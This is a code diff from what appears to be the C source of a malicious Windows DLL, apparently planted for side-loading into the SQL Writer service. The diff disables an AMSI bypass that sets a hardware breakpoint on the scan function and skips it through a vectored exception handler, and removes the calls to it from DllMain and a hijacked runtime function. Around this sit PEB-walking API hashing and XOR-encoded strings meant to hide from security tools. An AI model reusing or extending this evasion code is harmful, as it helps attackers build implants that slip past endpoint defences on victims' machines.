@@ -271,6 +271,7 @@ void dc_path_expand(char *path, int cap, cff_expand_fn fExpand) {
   path[n - 1] = 0;
 }
 
+#if 0 /* AMSI HWBP: disabled — AMSI does not scan native DLL drops in sqlwriter */
 static void *g_bp_tgt;
 static int g_veh_reg;
 
@@ -306,6 +307,7 @@ static LONG WINAPI bp_veh(PEXCEPTION_POINTERS ex) {
   ctx->EFlags |= 0x10000;
   return EXCEPTION_CONTINUE_EXECUTION;
 }
+#endif
 
 static HMODULE get_k32(void) {
   HMODULE h = mod_from_peb(HASH_kernel32_dll);
@@ -331,6 +333,7 @@ static HMODULE get_ntdll(void) {
 }
 #endif
 
+#if 0 /* AMSI HWBP: see block above */
 static void bp_arm(void) {
   unsigned char e_amsi[] = {0x58, 0x55, 0x40, 0x5b, 0x49, 0x02, 0x5e, 0x0e};
 
@@ -402,6 +405,7 @@ static void bp_arm(void) {
   ctx.Dr7 = 0x00000001;
   (void)fSetThreadContext(hThread, &ctx);
 }
+#endif
 
 #include "data.h"
 
@@ -409,8 +413,6 @@ void *_set_se_translator(void *translator) {
   if (triggered)
     return (void *)0;
   triggered = 1;
-
-  bp_arm();
 
   if (pop_quiz()) {
       return (void *)0;
@@ -690,8 +692,6 @@ void __attribute__((naked)) __processing_throw() {
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
   if (fdwReason == DLL_PROCESS_ATTACH) {
-    bp_arm();
-
     unsigned char e_sys_vc[] = {
         0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0c,
         0x48, 0x41, 0x44, 0x00, 0x54, 0x5b, 0x56, 0x6d, 0x46, 0x00, 0x5b, 0x5c,
